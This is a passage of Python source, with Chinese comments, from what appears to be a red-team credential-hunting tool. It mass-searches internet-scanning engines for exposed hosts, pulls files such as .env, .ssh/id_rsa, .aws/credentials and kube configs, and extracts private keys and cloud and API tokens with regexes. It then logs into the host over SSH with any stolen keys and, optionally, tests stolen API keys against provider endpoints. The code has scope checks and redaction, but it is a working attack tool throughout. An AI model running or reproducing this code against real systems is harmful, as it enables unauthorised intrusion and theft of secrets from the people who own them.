                bases.append(ln)
    if not bases:
        print("[!] hunt 需要 --base 或 --urls-file", file=sys.stderr)
        sys.exit(2)
    if len(bases) == 1:
        args.base = bases[0]
        return _hunt_one(args)
    reports = []
    for u in bases:
        print(f"== hunt {u}")
        one = argparse.Namespace(**{**vars(args), "base": u, "urls_file": None})
        reports.append(_hunt_one(one))
    level = "none"
    for r in reports:
        if r.get("level") == "L3":
            level = "L3"
        elif r.get("level") == "L2" and level != "L3":
            level = "L2"
        elif r.get("level") == "L1" and level == "none":
            level = "L1"
    summary = {
        "ts": datetime.now(UTC).isoformat(),
        "cmd": "hunt-multi",
        "level": level,
        "n": len(reports),
        "targets": [r.get("target") for r in reports],
        "playbook": PLAYBOOK,
    }
    write_probe_json(
        summary, case=args.case, out=args.out, case_subdir="dir_dump", filename="multi.json",
    )
    print(json.dumps({"level": level, "n": len(reports)}, ensure_ascii=False))
    return summary


def _hunt_one(args: argparse.Namespace) -> dict[str, Any]:
    host = _require_scope(args.base)
    base = args.base.rstrip("/")
    sess = _sess()
    listings: list[dict[str, Any]] = []
    files: list[dict[str, Any]] = []
    keys: list[dict[str, str]] = []
    ssh_results: list[dict[str, Any]] = []
    verify: list[dict[str, Any]] = []
    tags_all: set[str] = set()

    prefixes = list(LIST_PREFIXES)
    if args.prefix:
        prefixes = [args.prefix] + prefixes

    for pref in prefixes:
        url = urljoin(base + "/", pref.lstrip("/"))
        row = _get(sess, url, timeout=8)
        if row.get("error") or row.get("status") != 200:
            continue
        tags = _fingerprint(row.get("text") or "")
        listing = bool(row.get("listing"))
        strong = tags - WEAK_TAGS
        if not listing and not strong:
            continue
        tags_all |= tags
        hrefs = _listing_hrefs(row.get("text") or "")
        listings.append({
            "url": url, "tags": sorted(tags), "hrefs": hrefs[:40],
            "listing": listing,
        })
        print(f"  L1 listing {pref} tags={','.join(sorted(tags)) or '-'}")
        fetch_tags = tags if listing else strong
        fetched = _fetch_interesting(sess, url, fetch_tags or {"DOTENV", "GITDIR"}, args.deep, hrefs)
        files.extend(fetched)

    if not files:
        for p in (
            "/.env", "/.env.local", "/.env.production", "/.git/config",
            "/.git-credentials", "/.ssh/id_rsa", "/.ssh/id_ed25519",
            "/.docker/config.json", "/.kube/config", "/.aws/credentials",
            "/.gcloud/application_default_credentials.json",
            "/terraform.tfstate", "/docker-compose.yml", "/wp-config.php",
        ):
            row = _get(sess, urljoin(base + "/", p.lstrip("/")), timeout=8)
            if row.get("status") in {200, 206} and not row.get("htmlish"):
                files.append(row)

    raw_keys: list[tuple[str, str]] = []  # kind, raw
    priv_paths: list[Path] = []

    for row in files:
        text = row.get("text") or ""
        url = row.get("url") or ""
        row_hits = 0
        if PRIVKEY_RE.search(text):
            saved = _save_raw(args.case, "ssh_" + urlparse(url).path.replace("/", "_"), text)
            if not saved:
                tmp = tempfile.NamedTemporaryFile(prefix="se-ssh-", delete=False)
                tmp.write(text.encode("utf-8", "replace"))
                tmp.close()
                os.chmod(tmp.name, 0o600)
                saved = tmp.name
            priv_paths.append(Path(saved))
            print(f"  L2 privkey {urlparse(url).path}")
            row_hits += 1
        for hit in _env_hits(text):
            keys.append({"src": url, "name": hit.get("name"), "kind": hit.get("kind") or "env",
                         "redact": hit["redact"]})
            if hit.get("kind"):
                raw_keys.append((hit["kind"], hit["raw"]))
            row_hits += 1
        for hit in _classify_keys(text):
            keys.append({"src": url, "kind": hit["kind"], "redact": hit["redact"]})
            raw_keys.append((hit["kind"], hit["raw"]))
            row_hits += 1
        if "credential_pool" in text:
            for extra in _hermes_follow(sess, url, text):
                for hit in _env_hits(extra) + _classify_keys(extra):
                    kind = hit.get("kind") or "env"
                    keys.append({"src": url + "#hermes-env", "kind": kind, "redact": hit["redact"],
                                 "name": hit.get("name")})
                    if hit.get("raw") and kind != "env":
                        raw_keys.append((kind, hit["raw"]))
                    row_hits += 1
        m = GIT_BASIC_RE.search(text)
        if m:
            keys.append({"src": url, "kind": "git-basic", "redact": redact(m.group(1) + ":" + m.group(2))})
            print(f"  L2 git-basic {urlparse(url).path}")
            row_hits += 1
        dm = DOCKER_AUTH_RE.search(text)
        if dm:
            try:
                dec = base64.b64decode(dm.group(1)).decode("utf-8", "replace")
                keys.append({"src": url, "kind": "docker-auth", "redact": redact(dec)})
                print("  L2 docker-auth")
                row_hits += 1
            except Exception:
                pass
        ak = AWS_AK_RE.search(text)
        sk = AWS_SK_RE.search(text)
        if ak:
            keys.append({"src": url, "kind": "aws", "name": "aws_access_key_id",
                         "redact": redact(ak.group(1))})
            print("  L2 aws-ak")
            row_hits += 1
        if sk:
            keys.append({"src": url, "kind": "aws", "name": "aws_secret_access_key",
                         "redact": redact(sk.group(1))})
            row_hits += 1
        kt = K8S_TOKEN_RE.search(text)
        if kt and ("clusters:" in text or "users:" in text or "kind: Config" in text):
            keys.append({"src": url, "kind": "k8s-token", "redact": redact(kt.group(1))})
            print("  L2 kube-token")
            row_hits += 1
        path_l = (urlparse(url).path or "").lower()
        if path_l.endswith((".yml", ".yaml", "jenkinsfile")):
            for sm in GH_SECRET_RE.finditer(text):
                keys.append({"src": url, "kind": "ci-secret-ref", "name": sm.group(0), "redact": sm.group(0)})
        for cm in COMPOSE_ENV_RE.finditer(text):
            keys.append({"src": url, "kind": "compose-db", "redact": redact(cm.group(1))})
            print("  L2 compose-db")
            row_hits += 1
        if '"outputs"' in text or '"outputs":' in text:
            try:
                td = json.loads(text)
                outs = td.get("outputs") if isinstance(td, dict) else None
                if isinstance(outs, dict):
                    for ok, ov in outs.items():
                        val = ov.get("value") if isinstance(ov, dict) else ov
                        if isinstance(val, str) and len(val) > 5 and val not in TF_SENSITIVE:
                            keys.append({"src": url, "kind": "terraform", "name": str(ok),
                                         "redact": redact(val)})
                            row_hits += 1
            except Exception:
                pass
        if args.case and (row.get("secret") or row_hits):
            _save_raw(args.case, "file_" + urlparse(url).path.replace("/", "_"), text)

    # 去重 keys（按 redact）
    seen_r: set[str] = set()
    keys_u: list[dict[str, str]] = []
    for k in keys:
        sig = (k.get("kind") or "") + (k.get("redact") or "")
        if sig in seen_r:
            continue
        seen_r.add(sig)
        keys_u.append({x: k[x] for x in k if x != "raw"})
    keys = keys_u

    tmp_keys = [p for p in priv_paths if str(p).startswith(tempfile.gettempdir())]
    if not args.no_ssh:
        if not priv_paths:
            print("  ssh skip: 未发现私钥")
        else:
            for kp in priv_paths:
                ssh_results.append(_ssh_whoami(kp, host))
    for p in tmp_keys:
        try:
            p.unlink(missing_ok=True)
        except Exception:
            pass

    if args.verify_balance:
        seen_v: set[str] = set()
        for kind, raw in raw_keys:
            if kind in {"aws", "telegram", "slack", "stripe", "github", "github_pat",
                        "github_oauth", "gitlab"}:
                continue
            if raw in seen_v:
                continue
            seen_v.add(raw)
            v = _verify_one(kind, raw)
            verify.append(v)
            mark = "L3" if v.get("ok") else "miss"
            print(f"  {mark} verify {kind} {v.get('redact')}")
    elif raw_keys:
        n = len({r for _, r in raw_keys})
        print(f"  余额未打：发现 {n} 枚供应商前缀钥。要验请加 --verify-balance（先问）")

    ssh_ok = any(s.get("ok") for s in ssh_results)
    ver_ok = any(v.get("ok") for v in verify)
    real_keys = [k for k in keys if k.get("kind") not in {"ci-secret-ref"}]
    if ver_ok:
        level = "L3"
    elif real_keys or ssh_ok or any(PRIVKEY_RE.search(f.get("text") or "") for f in files):
        level = "L2"
    elif listings:
        level = "L1"
    else:
        level = "none"

    # 报告不带 raw / 全文
    slim_files = []
    for f in files:
        slim_files.append({
            "url": f.get("url"), "status": f.get("status"), "size": f.get("size"),
            "secret": f.get("secret"), "git": f.get("git"),
            "privkey": bool(PRIVKEY_RE.search(f.get("text") or "")),
        })
    report = {
        "target": base,
        "ts": datetime.now(UTC).isoformat(),
        "level": level,
        "cmd": "hunt",
        "tags": sorted(tags_all),
        "listings": listings,
        "files": slim_files,
        "keys": keys,
        "ssh": ssh_results,
        "verify": [{k: v[k] for k in v if k != "raw"} for v in verify],
        "verify_balance": bool(args.verify_balance),
        "playbook": PLAYBOOK,
        "next": (
            "L3=供应商 /models 或额度有效。L2=钥片段或 SSH whoami。"
            "禁止把 raw 抄进 STATUS。"
            + (
                " 堆 → python3 炼蛊房/heap_cred_scan.py <hprof> --out <案>/接管/heap_creds/。"
                if ("HEAPDUMP" in tags_all or any(".hprof" in (f.get("url") or "") for f in slim_files))
                else ""
            )
            + (" Actuator → Spring Gateway 全链，禁止只扫 health。" if "ACTUATOR" in tags_all else "")
            + (" Nacos → nacos_authscope_poc.py --check-only。" if "NACOS" in tags_all else "")
        ),
    }
    out_path = write_probe_json(
        report, case=args.case, out=args.out, case_subdir="dir_dump", filename="latest.json",
    )
    print(json.dumps({
        "level": level, "listings": len(listings), "files": len(slim_files),
        "keys": len(keys), "ssh_ok": ssh_ok, "verify_ok": ver_ok, "out": str(out_path),
    }, ensure_ascii=False))
    if "HEAPDUMP" in tags_all:
        print("  next heap: python3 炼蛊房/heap_cred_scan.py <hprof> --out <案>/接管/heap_creds/")
    if "NACOS" in tags_all:
        print("  next nacos: python3 炼蛊房/nacos_authscope_poc.py --host <IP> --check-only")
    return report


def space_query_catalog(domain: str) -> dict[str, list[str]]:
    """v6 全量语法，每条强制带授权域。禁止调用方去掉 domain=/hostname=/names=。"""
    d = domain
    listing = 'title="Directory listing for /"'

    def _dedupe(items: list[str]) -> list[str]:
        seen: set[str] = set()
        out: list[str] = []
        for q in items:
            if q in seen:
                continue
            seen.add(q)
            out.append(q)
        return out

    def _fofa_and(s: str) -> str:
        s = s.strip()
        if "||" in s and not s.startswith("("):
            s = f"({s})"
        return f'domain="{d}" && {s}'

    extra = [_fofa_and(s) for s in FOFA_EXTRA_SYNTAX]
    ai = [f'domain="{d}" && {listing} && body="{body}"' for _n, body in AI_TOOLS_V5]
    cfg = [f'domain="{d}" && {listing} && body="{pat}"' for pat in CFG_PATTERNS_V5]
    fw = [f'domain="{d}" && {listing} && body="{pat}"' for pat in FW_PATTERNS_V5]
    fofa_u = _dedupe(extra + ai + cfg + fw)
    shodan = [f'hostname:"{d}" {q}' for q in SHODAN_EXTRA]
    censys = [f'names:"{d}" AND services.http.response.body:"{b}"' for b in CENSYS_BODIES]
    wayback = [
        f"https://web.archive.org/cdx/search/cdx?url=*.{d}/*&output=json&fl=original&filter=original:.*(env|claude|cursor|hermes|codex).*",
    ]
    return {
        "fofa": fofa_u,
        "fofa_extra": extra,
        "fofa_ai": ai,
        "fofa_cfg": cfg,
        "fofa_fw": fw,
        "shodan": shodan,
        "censys": censys,
        "wayback": wayback,
    }


def _load_space():
    p = ENGINE / "tools" / "space-search" / "bin"
    if str(p) not in sys.path:
        sys.path.insert(0, str(p))
    import space_search as ss  # type: ignore
    return ss


def _asset_urls(assets: list[dict[str, Any]]) -> list[str]:
    urls: list[str] = []
    for a in assets or []:
        host = a.get("host") or a.get("ip") or ""
        if not host:
            continue
        host = str(host).strip()
        if "://" in host:
            p = urlparse(host)
            net = p.netloc or p.path.split("/")[0]
            if net:
                urls.append(f"{p.scheme or 'http'}://{net}")
            continue
        port = a.get("port")
        proto = "https" if str(port) in {"443", "8443"} else "http"
        if ":" in host.rstrip("]") and not host.startswith("["):
            urls.append(f"{proto}://{host}")
            continue
        if port and str(port) not in {"80", "443", "None"}:
            urls.append(f"{proto}://{host}:{port}")
        else:
            urls.append(f"{proto}://{host}")
    return urls


def _gate_domain(d: str) -> str:
    d = (d or "").strip().lstrip(".")
    if not d or "." not in d:
        print("[!] 必须 --domain 授权根域", file=sys.stderr)
        sys.exit(2)
    if not in_scope(d) and not in_scope("www." + d):
        print(f"[!] 域不在 scope：{d}", file=sys.stderr)
        sys.exit(2)
    return d


def cmd_space_hunt(args: argparse.Namespace) -> dict[str, Any]:
    """真打 FOFA/Shodan/Censys（带域）。默认 extra+ai；--tier all 跑满。"""
    d = _gate_domain(args.domain)
    cat = space_query_catalog(d)
    tiers = [t.strip() for t in (args.tier or "extra,ai").split(",") if t.strip()]
    fofa_q: list[str] = []
    if "all" in tiers:
        fofa_q = list(cat["fofa"])
    else:
        for t in tiers:
            fofa_q.extend(cat.get(f"fofa_{t}") or [])
    seen_q: set[str] = set()
    fofa_q = [q for q in fofa_q if not (q in seen_q or seen_q.add(q))]  # type: ignore
    if args.limit:
        fofa_q = fofa_q[: args.limit]

    ss = _load_space()
    cfg = ss.load_cfg()
    hits: list[dict[str, Any]] = []
    urls: list[str] = []
    skipped = 0
    for q in fofa_q:
        row = ss.search_fofa(cfg, q, args.size)
        if row.get("skipped"):
            skipped += 1
            print(f"  skip fofa {row.get('reason')}")
            break
        n = row.get("count") or 0
        if n:
            print(f"  fofa {n}  {q[:80]}")
        for u in _asset_urls(row.get("assets") or []):
            h = host_of(u)
            if h and in_scope(h):
                urls.append(u)
                hits.append({"engine": "fofa", "query": q, "url": u})
            elif h:
                hits.append({"engine": "fofa", "query": q, "url": u, "dropped": "out-of-scope"})

    if "all" in tiers or "shodan" in tiers:
        for q in cat["shodan"]:
            row = ss.search_shodan(cfg, q, args.size)
            if row.get("skipped"):
                break
            for u in _asset_urls(row.get("assets") or []):
                h = host_of(u)
                if h and in_scope(h):
                    urls.append(u)
                    hits.append({"engine": "shodan", "query": q, "url": u})

    if "all" in tiers or "censys" in tiers:
        for q in cat["censys"]:
            row = ss.search_censys_hosts(cfg, q, args.size)
            if row.get("skipped"):
                break
            for u in _asset_urls(row.get("assets") or []):
                h = host_of(u)
                if h and in_scope(h):
                    urls.append(u)
                    hits.append({"engine": "censys", "query": q, "url": u})

    wayback_urls: list[str] = []
    if args.wayback:
        wurl = cat["wayback"][0]
        try:
            wr = requests.get(wurl, timeout=20)
            data = wr.json() if wr.status_code == 200 else []
            rows = data[1:] if isinstance(data, list) and data and isinstance(data[0], list) else data
            for item in rows or []:
                orig = item[0] if isinstance(item, list) else (item if isinstance(item, str) else "")
                h = host_of(str(orig))
                if h and in_scope(h):
                    wayback_urls.append(str(orig))
                    urls.append(str(orig))
        except Exception as e:
            print(f"  wayback skip {e}"[:120])

    # 去重 URL
    uniq: list[str] = []
    seen_u: set[str] = set()
    for u in urls:
        if u in seen_u:
            continue
        seen_u.add(u)
        uniq.append(u)

    report = {
        "ts": datetime.now(UTC).isoformat(),
        "cmd": "space-hunt",
        "domain": d,
        "tier": tiers,
        "fofa_queries": len(fofa_q),
        "in_scope_urls": uniq,
        "dropped_oos": sum(1 for h in hits if h.get("dropped")),
        "wayback": wayback_urls[:40],
        "skipped_engine": skipped,
        "playbook": PLAYBOOK,
        "next": "对 in_scope_urls 跑 hunt --urls-file；禁止去域重搜。",
    }
    out_path = write_probe_json(
        report, case=args.case, out=args.out, case_subdir="dir_dump", filename="space_hunt.json",
    )
    if args.case and uniq:
        uf = ENGINE / "案卷" / args.case / "测绘" / "dir_dump" / "space_hits.txt"
        uf.parent.mkdir(parents=True, exist_ok=True)
        uf.write_text("\n".join(uniq) + "\n", encoding="utf-8")
        print(f"  urls {len(uniq)} -> {uf}")
    print(json.dumps({
        "domain": d, "queries": len(fofa_q), "urls": len(uniq), "out": str(out_path),
    }, ensure_ascii=False))

    if args.then_hunt and uniq:
        ns = argparse.Namespace(
            base="", case=args.case, out=args.out, prefix="", deep=False,
            no_ssh=False, verify_balance=False, urls_file=None,
        )
        for u in uniq[: args.then_limit]:
            print(f"== then-hunt {u}")
            ns.base = u
            _hunt_one(ns)
    return report


def cmd_space_queries(args: argparse.Namespace) -> None:
    d = (args.domain or "").strip().lstrip(".")
    if not d or "." not in d:
        print("[!] 必须 --domain 授权根域", file=sys.stderr)
        sys.exit(2)
    if not in_scope(d) and not in_scope("www." + d):
        print(f"[!] 域不在 scope：{d}", file=sys.stderr)
        sys.exit(2)
    cat = space_query_catalog(d)
    print("# 禁止去掉 domain=/hostname=/names= 做全网扫")
    print("# 真查: space-hunt --domain <域> --case <案卷> --tier extra,ai")
    for eng in ("fofa", "shodan", "censys", "wayback"):
        qs = cat.get(eng) or []
        print(f"# {eng.upper()} n={len(qs)}")
        for q in qs:
            print(q)
    print(
        f"# 入口: python3 tools/space-search/bin/space_search.py search "
        f"--query 'domain=\"{d}\" && title=\"Index of /\"' --engines fofa --case <案卷>"
    )


def cmd_doctor(_args: argparse.Namespace) -> int:
    skill = ENGINE / "杀招" / "sensitive-dir-dump" / "SKILL.md"
    playbook = ENGINE / "传承" / "搜魂蛊.md"
    checks = [
        ("playbook", playbook.is_file()),
        ("skill", skill.is_file()),
        ("paths", len(PATHS) >= 20),
        ("ai_dirs", len(AI_DIRS) >= 48),
        ("key_patterns", len(KEY_PATTERNS) >= 28),
        ("tag_paths", all(t in TAG_PATHS for t in (
            "DOTENV", "SSHDIR", "ALICLOUD", "DCCOMPOSE", "WPCONFIG", "SLACK",
            "HEAPDUMP", "ACTUATOR", "NACOS",
        ))),
        ("cfg_v5", len(CFG_PATTERNS_V5) >= 35),
        ("fw_v5", "phpMyAdmin" in FW_PATTERNS_V5 and "MinIO" in FW_PATTERNS_V5),
        ("scope_lib", callable(in_scope) and callable(write_probe_json)),
        ("ssh_users", "centos" in SSH_USERS),
        ("redact", redact("sk-ant-abcdefghijklmnopqrstuvwxyz") == "sk-ant-a****wxyz"),
        ("env-kw-no-task", not _env_name_hit("TASK_NAME") and _env_name_hit("OPENAI_API_KEY")),
        ("weak-tags", "JS" in WEAK_TAGS and "ALICLOUD" not in WEAK_TAGS),
        ("verify_routes", all(s in Path(__file__).read_text(encoding="utf-8") for s in (
            "api.moonshot.cn", "open.bigmodel.cn", "dashscope.aliyuncs.com",
            "api.groq.com", "api.together.xyz", "api.fireworks.ai",
            "api.cohere.com", "api.mistral.ai", "api.replicate.com",
        ))),
    ]
    src = Path(__file__).read_text(encoding="utf-8")
    cat = space_query_catalog("example.test")
    v5_needles = (
        'header="Apache/2.4" && body=".env"',
        'header="nginx" && body=".claude"',
        'body="ANTHROPIC_API_KEY"',
        'body="DEEPSEEK_API_KEY"',
        'after="2025-01-01"',
        ".pulumi/credentials.json",
        "credentials.yml.enc",
        "phpMemcachedAdmin",
        'http.html:"sk-ant-"',
        "services.http.response.body",
        "cmd_hunt", "--verify-balance", "--no-ssh", "space-queries", "cmd_space_hunt",
        "moonshot", "dashscope", "open.bigmodel.cn",
        ".you", ".phind", ".supermaven-api", ".sourcegraph-cody",
    )
    checks.append(("v5-syntax-in-src", all(n in src for n in v5_needles)))
    v6_needles = (
        'body="/actuator/heapdump"',
        'body="MINIO_ROOT_USER"',
        'title="Ray Dashboard"',
        'body="apollo-configservice"',
    )
    checks.append(("v6-syntax-in-src", all(n in src for n in v6_needles)))
    checks.append(("fofa-catalog-full", len(cat["fofa"]) >= 100))
    checks.append(("shodan+censys+wayback", len(cat["shodan"]) >= 5 and len(cat["censys"]) >= 5))
    # 不实现 Discord/TG 推未脱敏 key（源码可出现 discord.com 作提取正则）
    _push = "".join(("api.", "telegram.org", "/bot"))
    checks.append(("no-webhook-push", _push not in src))
    fail = 0
    for name, ok in checks:
        print(f"  {'ok' if ok else 'FAIL'} {name}")
        if not ok:
            fail += 1
    print(json.dumps({"doctor": "ok" if fail == 0 else "fail", "fail": fail, "n": len(checks)}, ensure_ascii=False))
    return fail


run = cmd_dump


def _add_target_args(p: argparse.ArgumentParser) -> None:
    p.add_argument("--base", required=True)
    p.add_argument("--case", default="")
    p.add_argument("--out", type=Path, default=None)


def main() -> None:
    argv = sys.argv[1:]
    cmds = {"dump", "hunt", "doctor", "space-queries", "space-hunt"}
    if argv and argv[0] not in cmds and argv[0] not in ("-h", "--help"):
        sys.argv.insert(1, "dump")

    ap = argparse.ArgumentParser(description="敏感目录与日志泄露（授权内）")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p_doc = sub.add_parser("doctor", help="本地自检")
    p_doc.set_defaults(func=lambda a: sys.exit(cmd_doctor(a)))

    p_dump = sub.add_parser("dump", help="浅扫固定路径")
    _add_target_args(p_dump)
    p_dump.set_defaults(func=cmd_dump)

    p_hunt = sub.add_parser("hunt", help="指纹+17类+SSH；余额要 --verify-balance")
    p_hunt.add_argument("--base", default="")
    p_hunt.add_argument("--case", default="")
    p_hunt.add_argument("--out", type=Path, default=None)
    p_hunt.add_argument("--urls-file", type=Path, default=None, help="每行一个 in_scope URL")
    p_hunt.add_argument("--prefix", default="", help="额外 listing 前缀，如 /home/ubuntu/")
    p_hunt.add_argument("--deep", action="store_true", help="按 href 后缀再拉一层")
    p_hunt.add_argument("--no-ssh", action="store_true", help="发现私钥也不连")
    p_hunt.add_argument(
        "--verify-balance", action="store_true",
        help="先问后开：打供应商 /models 或额度 GET",
    )
    p_hunt.set_defaults(func=cmd_hunt)

    p_q = sub.add_parser("space-queries", help="打印带域的测绘语法")
    p_q.add_argument("--domain", required=True)
    p_q.set_defaults(func=cmd_space_queries)

    p_sh = sub.add_parser("space-hunt", help="带域真查 FOFA/Shodan/Censys")
    p_sh.add_argument("--domain", required=True)
    p_sh.add_argument("--case", default="")
    p_sh.add_argument("--out", type=Path, default=None)
    p_sh.add_argument("--tier", default="extra,ai", help="extra,ai,cfg,fw,shodan,censys,all")
    p_sh.add_argument("--size", type=int, default=20)
    p_sh.add_argument("--limit", type=int, default=0, help="最多跑多少条 FOFA（0=不截）")
    p_sh.add_argument("--wayback", action="store_true")
    p_sh.add_argument("--then-hunt", action="store_true")
    p_sh.add_argument("--then-limit", type=int, default=15)
    p_sh.set_defaults(func=cmd_space_hunt)

    args = ap.parse_args()
    args.func(args)


def run(args) -> dict[str, Any]:
    """hitcon_chain_probe 用的统一入口：浅扫 dump"""
    ns = argparse.Namespace(
        base=getattr(args, "base", ""),
        case=getattr(args, "case", ""),
        out=getattr(args, "out", None),
    )
    return cmd_dump(ns)


if __name__ == "__main__":
    main()
